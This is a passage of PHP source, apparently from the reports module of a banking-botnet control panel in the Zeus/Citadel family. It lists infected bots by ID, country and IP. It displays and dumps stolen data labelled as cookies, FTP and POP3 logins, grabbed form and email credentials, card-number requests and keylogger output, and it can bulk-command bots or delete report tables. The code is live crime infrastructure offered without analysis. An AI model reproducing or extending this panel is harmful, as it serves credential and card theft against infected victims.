            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'nonames', 1, LNG_REPORTS_FILTER_NONAMES, ''),
                        $filter['nonames'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'plain', 1, LNG_REPORTS_FILTER_PLAIN, ''),
                        $filter['plain'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Управление.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
        THEME_STRING_SPACE.
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
        ($_allow_remove ? THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_REMOVE, ' onclick="RemoveReports()"'), THEME_DIALOG_ITEM_ACTION) : '').
      THEME_DIALOG_ACTIONLIST_END.
    THEME_DIALOG_END.
  THEME_FORMGET_END;

  //Вывод результата.
  if($_is_ajax_result)
  {
    //Создание списока дейcтвий.    
    $al = '';
    if($filter['rm'] !== 1 && $filter['nonames'] !== 1 && count($botMenu) > 0)
    {
      $al = str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('checkall', 1, ' onclick="checkAll()"'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3).THEME_STRING_SPACE.
            LNG_REPORTS_BOTSACTION.THEME_STRING_SPACE.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
      foreach($botMenu as $item)$al .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
      $al .= THEME_DIALOG_ITEM_LISTBOX_END.THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
      $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
    }

    //Результат.
    echo
    THEME_VSPACE.
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
      str_replace('{WIDTH}', '80%', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE).
        $al.
        $datelist.
      THEME_DIALOG_END.
    THEME_FORMGET_END;
  }
/* [Infinite-scroll commented-out]
  print <<<HTML
<script src="theme/js/imakewebthings-jquery-waypoints-7101ff2/waypoints.min.js"></script>
<script>

function install_infinite_scroller(){
	var onscrollto = function(){
		var a = $(this);
		a.html('<img src="theme/throbber.gif" />');
		$.get( a.attr('href'), function(data, status, req){
			a.replaceWith(data);
			window.install_infinite_scroller();
			});
		return false;
		};
	$('a.load_next_page').live('click', onscrollto);
	$('a.load_next_page').waypoint(onscrollto, { offset: '10000%' });
	}

$(function(){
	$('.report_wrapper').live('click', function(){
		var report = $(this);
		report.fadeOut();
		$.get('?m={$_GET['m']}&favorite_toggle='+report.attr('data-report-id'), function(data, status, req){
			report.stop().toggleClass('favorite').fadeIn();
			});
		return false;
		});
	});

</script>
 HTML; */
echo <<<HTML
<script src="theme/js/page-reports_db.js"></script>
HTML;

  ThemeEnd();
}
else if($_is_ajax_search)
{
  //Ищим таблицу.
  $table = 0;
  foreach($rlist as $t)if(intval(substr($t, -6)) == $filter['date']){$table = $t; break;}
  if($table === 0)die(LNG_REPORTS_DATE_EMPTY);
  
  //Выполняем запрос.
  if($filter['rm'] === 1)
  {
    if($query1 == '')$q = 'DROP TABLE IF EXISTS '.$table;
    else $q = 'DELETE QUICK FROM '.$table.$query1;
    
    if(!mysqlQueryEx($table, $q))die(mysqlErrorEx());
    if($query1 == '')die(LNG_REPORTS_DATE_DROPPED);
    die(sprintf(LNG_REPORTS_DATE_REMOVED, mysql_affected_rows()));
  }
  else
  {
    $last_botid = 0;
    $GLOBALS['_next_bot_popupmenu__'] = $filter['date'];
    /* // [Infinite-scroll commented-out]
    if (!isset($_GET['limit']))
	    $_GET['limit'] = 0;
    $limit = $_GET['limit'];
    $limit_perpage = 4096;
    $nextpage_url = '?';
    foreach ($_GET as $k => $v)
	    $nextpage_url .= urlencode($k).'='.urlencode(  ($k=='limit')? $v+$limit_perpage : $v) .'&';
    */
    $q = 'SELECT
			`t`.`id`,
			`t`.`bot_id`,
			COALESCE(`blip`.`country`, `t`.`country`) AS `country`,
			`t`.`ipv4`,
			SUBSTRING(`t`.`context`, 1, '.REPORT_PREVIEW_MAX_CHARS.'),
			SUBSTRING(`t`.`path_source`, 1, '.REPORT_PREVIEW_MAX_CHARS.'),
			`t`.`type`
		FROM '.$table.' AS `t`
			LEFT JOIN `botnet_list` `blip` ON(`t`.`country`="??" AND `t`.`bot_id` = `blip`.`bot_id`)
		'.$qjoin.$query1.$query2;//." LIMIT $limit, $limit_perpage;";
    $r = mysqlQueryEx($table, $q);
    if(!$r)die(mysqlErrorEx());
    if(mysql_affected_rows() == 0)die(LNG_REPORTS_DATE_NOREPORTS);
    
    $favorite_bots = array();
    $fb_R = mysql_query('SELECT bot_id, comment FROM `botnet_list` WHERE `comment`<>"";');
    while (!is_bool($fb_r = mysql_fetch_row($fb_R)))
	    $favorite_bots[  $fb_r[0]  ] = $fb_r[1];

	echo '<ul class="bot-search-results">';

    //Выводим результат.
    $nn = $filter['nonames']; 
    while(($m = mysql_fetch_row($r)))
    {
      //Запись нового имени бота.
      if($nn === 0 && strcasecmp($m[1], $last_botid) !== 0)
      {
	    if ($last_botid !== 0)
		    echo '</ol></li>'; # /ol.bot-reports, /ul.bots li
        $last_botid = $m[1];

	    echo '<li>',
	        '<div class="bot-header">',
		        '<div class="botid">',
	                '<input type="checkbox" name="bots[]" value="', htmlentities($m[1]), '" /> ',
			        botPopupMenu($m[1], 'botmenu', isset($favorite_bots[$m[1]])?$favorite_bots[$m[1]]:''),
		            '</div>',
		        '<div class="bot-info">',
			        htmlEntitiesEx($m[2].', '.$m[3]),
	                '</div>',
	            '</div>',
	        '<ol class="bot-reports" data-botid="'.htmlentities($m[1]).'">';
      }
      
      //Запись заголовка лога.
      $st1 = trim($m[4]);
      $st2 = trim($m[5]);
      if(mb_strlen($st1) >= REPORT_PREVIEW_MAX_CHARS)$st1 .= '...';
      if(mb_strlen($st2) >= REPORT_PREVIEW_MAX_CHARS)$st2 .= '...';
      
      $text = '';
      switch($m[6])
      {
        case BLT_COOKIES:               $text = LNG_BLT_COOKIES; break;
        case BLT_FILE:                  $text = LNG_BLT_FILE.'. '.htmlEntitiesEx($st2); break;
        case BLT_HTTP_REQUEST:
        case BLT_HTTPS_REQUEST:         $text = htmlEntitiesEx($st2); break;
        case BLT_LUHN10_REQUEST:        $text = LNG_BLT_LUHN10_REQUEST.'. '.htmlEntitiesEx($st2); break;        
        case BLT_LOGIN_FTP:             $text = str_replace(array('{URL}', '{TEXT}'), htmlEntitiesEx($st1), THEME_STRING_REPORTPREVIEW_FTP); break;
        case BLT_LOGIN_POP3:            $text = htmlEntitiesEx($st1); break;
        case BLT_FILE_SEARCH:           $text = htmlEntitiesEx($st1); break;
        case BLT_GRABBED_UI:            $text = LNG_BLT_GRABBED_UI.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_HTTP:          $text = LNG_BLT_GRABBED_HTTP.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_WSOCKET:       $text = LNG_BLT_GRABBED_WSOCKET.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_FTPSOFTWARE:   $text = LNG_BLT_GRABBED_FTPSOFTWARE.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_EMAILSOFTWARE: $text = LNG_BLT_GRABBED_EMAILSOFTWARE.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_OTHER:         $text = LNG_BLT_GRABBED_OTHER.'. '.htmlEntitiesEx($st2); break;
        case BLT_COMMANDLINE_RESULT:    $text = LNG_BLT_COMMANDLINE_RESULT; break;
        case BLT_ANALYTICS_SOFTWARE:    $text = LNG_BLT_ANALYTICS_SOFTWARE; break;
        case BLT_ANALYTICS_FIREWALL:    $text = LNG_BLT_ANALYTICS_FIREWALL; break;
        case BLT_ANALYTICS_ANTIVIRUS:   $text = LNG_BLT_ANALYTICS_ANTIVIRUS; break;
        case BLT_KEYLOGGER:             $text = LNG_BLT_KEYLOGGER.'. '.htmlEntitiesEx($st2);
        default:                      $text = LNG_BLT_UNKNOWN;
      }

	  # Report
	  echo '<li><a href="', QUERY_STRING_HTML.'&amp;t='.htmlEntitiesEx($filter['date']).'&amp;id='.$m[0], '">[+]</a> '.$text.'</li>';
    }
  echo '</ul>';
  }
  
  /* // [Infinite-scroll commented-out]
  print '<br><br><a class="load_next_page" href="'.$nextpage_url.'">'.LNG_REPORTS_VIEW_NEXTPAGE.'</a>';
  */
}
else if($_is_plain_search)
{
  define('REPEAT_SIZE', 40); //Размер визальных разделитилей.
  define('HEADER_PAD',  30); //Длина заголовков.
  
  httpNoCacheHeaders();
	header('Content-Type: text/plain; charset=utf-8');
	echo "\xEF\xBB\xBF"; //UTF8 BOM
  
  $nc = $filter['nonames'];
  
  foreach($rlist as $t)
  {
    $v = intval(substr($t, -6));
    if($v >= $filter['date1'] && $v <= $filter['date2'])
    {
      $lastdata = array_fill(0, 16, 0);
      
      //Заголовок даты.
      echo str_repeat('=', REPEAT_SIZE).' '.gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)).' '.str_repeat('=', REPEAT_SIZE)."\r\n";
      flush();
      
      //Запрос.                 //0     //1     //2          //3         //4          //5          //6             //7        //8    //9      //10  //11          //12          //13         //14
      $r = mysqlQueryEx($t,
                        $q='SELECT bot_id, botnet, bot_version, os_version, language_id, time_system, time_localbias, time_tick, rtime, country, ipv4, process_name, process_info, path_source, type,'.
                                //15      //16
                        'LENGTH(context), context FROM '.$t.' `t` '.$query1.$query2);
      if(!$r)echo mysqlErrorEx();
      else if(mysql_affected_rows() == 0)echo LNG_REPORTS_DATE_NOREPORTS;
      else while(($m = mysql_fetch_row($r)))
      {
        if($nc !== 1)
        {
          $hdr = '';

          if(strcmp($lastdata[0], $m[0]) !== 0)
          {
            $lastdata = array_fill(0, 16, 0);
            $hdr .= str_pad(LNG_REPORTS_VIEW_BOTID, HEADER_PAD).($lastdata[0] = $m[0])."\r\n";
          }
          
          if(strcmp($lastdata[1], $m[1]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_BOTNET,  HEADER_PAD).               ($lastdata[1] = $m[1])."\r\n";
          if($lastdata[2] !== $m[2])           $hdr .= str_pad(LNG_REPORTS_VIEW_VERSION, HEADER_PAD).intToVersion(  ($lastdata[2] = $m[2]))."\r\n";
          if(strcmp($lastdata[3], $m[3]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_OS,      HEADER_PAD).osDataToString(($lastdata[3] = $m[3]))."\r\n";
          if($lastdata[4] !== $m[4])           $hdr .= str_pad(LNG_REPORTS_VIEW_OSLANG,  HEADER_PAD).               ($lastdata[4] = $m[4])."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[5] + $m[6])."\r\n";
          
          if($lastdata[6] !== $m[6])$hdr .= str_pad(LNG_REPORTS_VIEW_TIMEBIAS, HEADER_PAD).timeBiasToText(($lastdata[6] = $m[6]))."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TICK,  HEADER_PAD).tickCountToText($m[7] / 1000)."\r\n";
          $hdr .= str_pad(LNG_REPORTS_VIEW_RTIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[8])."\r\n";
          
          if(strcmp($lastdata[9], $m[9]) !== 0)  $hdr .= str_pad(LNG_REPORTS_VIEW_COUNTRY,  HEADER_PAD).($lastdata[9]  = $m[9])."\r\n";
          if(strcmp($lastdata[10], $m[10]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_IPV4,     HEADER_PAD).($lastdata[10] = $m[10])."\r\n";
          
          echo "\r\n".str_repeat('=', REPEAT_SIZE)."\r\n".
               $hdr.
               str_pad(LNG_REPORTS_VIEW_PROCNAME, HEADER_PAD).(empty($m[11]) ? '-' : $m[11])."\r\n".
               str_pad(LNG_REPORTS_VIEW_PROCINFO, HEADER_PAD).(empty($m[12]) ? '-' : $m[12])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SOURCE,   HEADER_PAD).(empty($m[13]) ? '-' : $m[13])."\r\n".
               str_pad(LNG_REPORTS_VIEW_TYPE,     HEADER_PAD).bltToLng($m[14])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SIZE,     HEADER_PAD).numberFormatAsInt($m[15])."\r\n".
               "\r\n".str_repeat('-', REPEAT_SIZE)."\r\n";
        }
        
        echo $m[16]."\r\n\r\n";  
        flush();
      }
      
      echo "\r\n";  
    }
  }
  
  echo "\r\n".str_repeat('=', REPEAT_SIZE).' EOF '.str_repeat('=', REPEAT_SIZE);
}

die();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Создание списка дат по таблицам botnet_reports_* для элемента select.
  
  IN $name  - string, название элемента select.
  IN $rlist - array, список таблиц.
  
  Return    - string, набор THEME_DIALOG_ITEM_LISTBOX_ITEM.
*/
function MakeDateList($name, $rlist)
{
  $rlist_count = count($rlist);
  $f = '';
  
  if($rlist_count == 0)
  {
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(0, '--.--'), THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR);
  }
  else for($i = 0, $cur = 0; $i < $rlist_count; $i++)
  {
    if($cur == 0 && ($GLOBALS['filter'][$name] === intval(substr($rlist[$i], -6)) || $i + 1 == $rlist_count))
    {
      $item = THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR;
      $cur++;
    }
    else $item = THEME_DIALOG_ITEM_LISTBOX_ITEM;
  
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(htmlEntitiesEx(substr($rlist[$i], -6)), htmlEntitiesEx(substr($rlist[$i], -2, 2).'.'.substr($rlist[$i], -4, 2))), $item);
  }
  
  return $f;
}
?>